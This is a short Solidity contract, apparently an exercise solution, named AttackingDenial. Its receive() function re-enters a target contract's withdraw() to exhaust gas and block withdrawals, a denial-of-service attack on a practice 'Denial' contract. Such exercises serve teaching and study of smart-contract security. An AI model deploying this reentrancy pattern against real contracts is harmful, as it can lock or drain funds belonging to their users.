// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

interface DenialInterface {
    function withdraw() external;
}

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    //Code me!
    receive() external payable {
        DenialInterface(contractAddress).withdraw();
    }

}
